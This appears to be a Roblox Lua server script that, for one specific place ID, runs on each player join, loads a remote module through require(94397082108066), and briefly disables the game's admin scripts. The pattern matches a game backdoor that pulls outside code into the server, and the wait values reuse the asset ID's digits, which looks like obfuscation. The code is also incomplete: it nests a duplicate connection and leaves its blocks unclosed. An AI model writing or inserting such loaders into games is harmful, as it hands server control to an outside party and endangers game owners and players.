if game.PlaceId == 14747334292 then
    local chatcon = {}
    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
        wait(0.94397082108066)
        chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
            require(94397082108066)
            game.ServerScriptService["Touch Kohls Admin"].Enabled = false
            game.ServerScriptService["setting commands"].Enabled = false
            wait(0.94397082108066)
            game.ServerScriptService["Touch Kohls Admin"].Enabled = true
            game.ServerScriptService["setting commands"].Enabled = true
